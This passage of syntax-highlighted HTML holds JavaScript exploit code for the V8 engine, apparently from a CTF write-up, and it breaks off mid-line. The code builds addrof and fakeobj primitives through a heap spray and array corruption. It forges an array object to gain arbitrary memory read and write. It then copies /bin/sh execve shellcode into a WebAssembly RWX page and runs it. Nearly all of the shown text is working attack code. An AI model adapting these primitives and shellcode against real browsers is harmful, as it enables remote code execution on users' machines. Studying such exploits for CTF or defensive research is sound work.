style="color:#B07D48">main</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> instance_addr</span><span style="color:#999999"> =</span><span style="color:#59873A"> addrof</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">wasmInstance</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> trusted_data</span><span style="color:#999999"> =</span><span style="color:#59873A"> read64</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">instance_addr</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">trusted_data</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> rwx</span><span style="color:#999999"> =</span><span style="color:#59873A"> read64</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">trusted_data</span><span style="color:#AB5959">+</span><span style="color:#2F798A">0x20</span><span style="color:#AB5959">n</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">rwx</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">    var</span><span style="color:#B07D48"> data_buf</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> ArrayBuffer</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">0x400</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    var</span><span style="color:#B07D48"> data_view</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> DataView</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">data_buf</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> backing</span><span style="color:#999999"> =</span><span style="color:#59873A"> addrof</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">data_buf</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 0x18</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 0x4</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> haddr</span><span style="color:#999999"> =</span><span style="color:#59873A"> read64</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">backing</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">backing</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">haddr</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><br><span style="color:#A0ADA0">	// %SystemBreak();</span><br><br><span style="color:#59873A">	write64</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">backing</span><span style="color:#999999">,</span><span style="color:#B07D48"> rwx</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    let</span><span style="color:#B07D48"> shellcode</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a65e2b">[</span><br><span style="color:#2F798A">      0x2fbb485299583b6a</span><span style="color:#AB5959">n</span><span style="color:#999999">,</span><br><span style="color:#2F798A">      0x5368732f6e69622f</span><span style="color:#AB5959">n</span><span style="color:#999999">,</span><br><span style="color:#2F798A">      0x050f5e5457525f54</span><span style="color:#AB5959">n</span><br><span style="color:#999999">        </span><span style="color:#a65e2b">]</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    for</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#AB5959">let</span><span style="color:#B07D48"> i</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#999999"> </span><span style="color:#999999">&#x3C;</span><span style="color:#B07D48"> shellcode</span><span style="color:#999999">.</span><span style="color:#998418">length</span><span style="color:#999999">;</span><span style="color:#AB5959"> ++</span><span style="color:#B07D48">i</span><span style="color:#a65e2b">)</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">{</span><br><span style="color:#B07D48">		data_view</span><span style="color:#999999">.</span><span style="color:#59873A">setFloat64</span><span style="color:#a13865">(</span><span style="color:#B07D48">i</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#999999">,</span><span style="color:#B07D48"> shellcode</span><span style="color:#bda437">[</span><span style="color:#B07D48">i</span><span style="color:#bda437">]</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#bda437">(</span><span style="color:#bda437">)</span><span style="color:#999999">,</span><span style="color:#1E754F"> true</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">}</span><br><span style="color:#A0ADA0">	// %SystemBreak();</span><br><br><span style="color:#59873A">    f</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1e754f">}</span><span style="color:#2993a3">)</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#758575DD">/* Conversion code from https://github.com/google/google-ctf/blob/main/2018/finals/pwn-just-in-time/exploit/index.html */</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> conversion_buffer</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> ArrayBuffer</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> float_view</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> Float64Array</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">conversion_buffer</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> int_view</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> BigUint64Array</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">conversion_buffer</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#B8A965">BigInt</span><span style="color:#666666">.</span><span style="color:#B8A965">prototype</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#666666"> =</span><span style="color:#CB7676"> function</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#4D9375">    return</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">0x</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> +</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#80A665">toString</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">16</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><span style="color:#666666">;</span><br><br><span style="color:#B8A965">BigInt</span><span style="color:#666666">.</span><span style="color:#B8A965">prototype</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#666666"> =</span><span style="color:#CB7676"> function</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">    int_view</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#C99076"> this</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#BD976A"> float_view</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#B8A965">BigInt</span><span style="color:#666666">.</span><span style="color:#B8A965">prototype</span><span style="color:#666666">.</span><span style="color:#80A665">smi2f</span><span style="color:#666666"> =</span><span style="color:#CB7676"> function</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">    int_view</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#C99076"> this</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#BD976A"> float_view</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#B8A965">Number</span><span style="color:#666666">.</span><span style="color:#B8A965">prototype</span><span style="color:#666666">.</span><span style="color:#80A665">f2i</span><span style="color:#666666"> =</span><span style="color:#CB7676"> function</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">    float_view</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#C99076"> this</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#BD976A"> int_view</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#B8A965">Number</span><span style="color:#666666">.</span><span style="color:#B8A965">prototype</span><span style="color:#666666">.</span><span style="color:#80A665">f2smi</span><span style="color:#666666"> =</span><span style="color:#CB7676"> function</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">    float_view</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#C99076"> this</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#BD976A"> int_view</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#B8A965">Number</span><span style="color:#666666">.</span><span style="color:#B8A965">prototype</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#666666"> =</span><span style="color:#CB7676"> function</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#4D9375">    return</span><span style="color:#80A665"> BigInt</span><span style="color:#4d9375">(</span><span style="color:#C99076">this</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#B8A965">Number</span><span style="color:#666666">.</span><span style="color:#B8A965">prototype</span><span style="color:#666666">.</span><span style="color:#80A665">smi2f</span><span style="color:#666666"> =</span><span style="color:#CB7676"> function</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#4D9375">    return</span><span style="color:#80A665"> BigInt</span><span style="color:#4d9375">(</span><span style="color:#C99076">this</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#80A665">smi2f</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><span style="color:#CB7676">function</span><span style="color:#80A665"> sleep</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">time</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">	var</span><span style="color:#BD976A"> timeStamp</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> Date</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#80A665">getTime</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	var</span><span style="color:#BD976A"> endTime</span><span style="color:#666666"> =</span><span style="color:#BD976A"> timeStamp</span><span style="color:#CB7676"> +</span><span style="color:#BD976A"> time</span><span style="color:#666666">;</span><br><span style="color:#4D9375">	while</span><span style="color:#4d9375">(</span><span style="color:#4D9375">true</span><span style="color:#4d9375">)</span><span style="color:#4d9375">{</span><br><span style="color:#4D9375">		if</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#CB7676">new</span><span style="color:#80A665"> Date</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">.</span><span style="color:#80A665">getTime</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666"> </span><span style="color:#666666">></span><span style="color:#BD976A"> endTime</span><span style="color:#d4976c">)</span><span style="color:#d4976c">{</span><br><span style="color:#4D9375">			return</span><span style="color:#666666">;</span><br><span style="color:#666666">		</span><span style="color:#d4976c">}</span><br><span style="color:#666666">	</span><span style="color:#4d9375">}</span><br><span style="color:#5eaab5">}</span><br><span style="color:#CB7676">function</span><span style="color:#80A665"> debug</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">objWrapper</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> objName</span><span style="color:#666666"> =</span><span style="color:#BD976A"> Object</span><span style="color:#666666">.</span><span style="color:#80A665">keys</span><span style="color:#4d9375">(</span><span style="color:#BD976A">objWrapper</span><span style="color:#4d9375">)</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> objValue</span><span style="color:#666666"> =</span><span style="color:#BD976A"> objWrapper</span><span style="color:#4d9375">[</span><span style="color:#BD976A">objName</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">`</span><span style="color:#C98A7D">--- Debugging: </span><span style="color:#4D9375">${</span><span style="color:#C98A7D">objName</span><span style="color:#4D9375">}</span><span style="color:#C98A7D"> ---</span><span style="color:#C98A7D77">`</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#758575DD">	// %DebugPrint(objValue);</span><br><span style="color:#BD976A">	console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">`</span><span style="color:#C98A7D">--- End of: </span><span style="color:#4D9375">${</span><span style="color:#C98A7D">objName</span><span style="color:#4D9375">}</span><span style="color:#C98A7D"> ---</span><span style="color:#C98A7D77">`</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><br><span style="color:#5eaab5">(</span><span style="color:#CB7676">function</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#C98A7D77">	"</span><span style="color:#C98A7D">use strict</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">	function</span><span style="color:#80A665"> makePackedDoubleArray</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#4D9375">		return</span><span style="color:#666666"> </span><span style="color:#d9739f">[</span><span style="color:#4C9A91">13.37</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 13.37</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 13.37</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 13.37</span><span style="color:#d9739f">]</span><span style="color:#666666">.</span><span style="color:#80A665">slice</span><span style="color:#d9739f">(</span><span style="color:#4C9A91">0</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#d4976c">}</span><br><span style="color:#CB7676">	function</span><span style="color:#80A665"> makePackedArray</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#4D9375">		return</span><span style="color:#666666"> </span><span style="color:#d9739f">[</span><span style="color:#4C9A91">13.37</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 13.37</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 13.37</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#e6cc77">{</span><span style="color:#e6cc77">}</span><span style="color:#d9739f">]</span><span style="color:#666666">.</span><span style="color:#80A665">slice</span><span style="color:#d9739f">(</span><span style="color:#4C9A91">0</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#d4976c">}</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> spraySize</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0x5000</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> spray</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> Array</span><span style="color:#d4976c">(</span><span style="color:#BD976A">spraySize</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><br><span style="color:#758575DD">	// for (let i = 0; i &#x3C; 200000; i++) shellcode(0);</span><br><br><span style="color:#4D9375">	for</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#CB7676">let</span><span style="color:#BD976A"> i</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#666666"> </span><span style="color:#666666">&#x3C;</span><span style="color:#BD976A"> spraySize</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#CB7676"> +=</span><span style="color:#4C9A91"> 3</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#BD976A">		spray</span><span style="color:#d9739f">[</span><span style="color:#BD976A">i</span><span style="color:#d9739f">]</span><span style="color:#666666"> =</span><span style="color:#80A665"> makePackedDoubleArray</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">		spray</span><span style="color:#d9739f">[</span><span style="color:#BD976A">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#d9739f">]</span><span style="color:#666666"> =</span><span style="color:#80A665"> makePackedDoubleArray</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">		spray</span><span style="color:#d9739f">[</span><span style="color:#BD976A">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#d9739f">]</span><span style="color:#666666"> =</span><span style="color:#80A665"> makePackedArray</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#d4976c">}</span><br><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> corruptorIndex</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0x2000</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> c</span><span style="color:#666666"> =</span><span style="color:#BD976A"> spray</span><span style="color:#d4976c">[</span><span style="color:#BD976A">corruptorIndex</span><span style="color:#d4976c">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> d</span><span style="color:#666666"> =</span><span style="color:#BD976A"> spray</span><span style="color:#d4976c">[</span><span style="color:#BD976A">corruptorIndex</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 1</span><span style="color:#d4976c">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> e</span><span style="color:#666666"> =</span><span style="color:#BD976A"> spray</span><span style="color:#d4976c">[</span><span style="color:#BD976A">corruptorIndex</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 2</span><span style="color:#d4976c">]</span><span style="color:#666666">;</span><br><span style="color:#758575DD">	// const f = [{}];</span><br><span style="color:#BD976A">	e</span><span style="color:#666666">.</span><span style="color:#80A665">magic</span><span style="color:#d4976c">(</span><span style="color:#BD976A">e</span><span style="color:#666666">.</span><span style="color:#B8A965">length</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 38</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> PACKED_DOUBLE_ELEMENTS_MAP_ADDR</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0x80b4f1</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> PACKED_ELEMENTS_MAP_ADDR</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0x80b579</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> FIXED_DOUBLE_ARRAY_TYPE</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0x911</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> FIXED_ARRAY_TYPE</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0x5dd</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> PROPERTIES_ADDR</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0x7bd</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><br><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> test_obj</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><span style="color:#d4976c">}</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	d</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">35</span><span style="color:#d4976c">]</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 13.37</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	function</span><span style="color:#80A665"> addrof</span><span style="color:#d4976c">(</span><span style="color:#BD976A">obj</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#BD976A">		c</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">0</span><span style="color:#d9739f">]</span><span style="color:#666666"> =</span><span style="color:#BD976A"> obj</span><span style="color:#666666">;</span><br><span style="color:#CB7676">		let</span><span style="color:#BD976A"> res</span><span style="color:#666666"> =</span><span style="color:#BD976A"> d</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">5</span><span style="color:#d9739f">]</span><span style="color:#666666">.</span><span style="color:#80A665">f2i</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">		return</span><span style="color:#BD976A"> res</span><span style="color:#CB7676"> &#x26;</span><span style="color:#4C9A91"> 0xffffffff</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#d4976c">}</span><br><br><span style="color:#CB7676">	function</span><span style="color:#80A665"> fakeobj</span><span style="color:#d4976c">(</span><span style="color:#BD976A">addr</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#BD976A">		d</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">5</span><span style="color:#d9739f">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#e6cc77">(</span><span style="color:#BD976A">addr</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#e6cc77">)</span><span style="color:#CB7676"> |</span><span style="color:#BD976A"> addr</span><span style="color:#d9739f">)</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">		return</span><span style="color:#BD976A"> c</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">0</span><span style="color:#d9739f">]</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#d4976c">}</span><br><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> arbrw_arr</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d4976c">[</span><span style="color:#4C9A91">1.1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2.2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3.3</span><span style="color:#d4976c">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> fake_arr</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d4976c">[</span><br><span style="color:#666666">		</span><span style="color:#d9739f">(</span><span style="color:#e6cc77">(</span><span style="color:#BD976A">PROPERTIES_ADDR</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#e6cc77">)</span><span style="color:#CB7676"> |</span><span style="color:#BD976A"> PACKED_DOUBLE_ELEMENTS_MAP_ADDR</span><span style="color:#d9739f">)</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">,</span><span style="color:#758575DD"> // 伪造好不变的字段</span><br><span style="color:#4C9A91">		0x4141414141414141</span><span style="color:#CB7676">n</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#758575DD"> // 留出 length | elements 的空间</span><br><span style="color:#666666">	</span><span style="color:#d4976c">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> fake_arr_addr</span><span style="color:#666666"> =</span><span style="color:#80A665"> addrof</span><span style="color:#d4976c">(</span><span style="color:#BD976A">fake_arr</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">fake_arr_addr =></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> fake_arr_addr</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> fake_arr_elements_addr</span><span style="color:#666666"> =</span><span style="color:#BD976A"> fake_arr_addr</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 0x84</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> arbrw_arr_addr</span><span style="color:#666666"> =</span><span style="color:#80A665"> addrof</span><span style="color:#d4976c">(</span><span style="color:#BD976A">arbrw_arr</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">arbrw_arr_addr =></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> arbrw_arr_addr</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	fake_arr</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">1</span><span style="color:#d4976c">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#4C9A91">8</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> |</span><span style="color:#BD976A"> arbrw_arr_addr</span><span style="color:#d4976c">)</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span 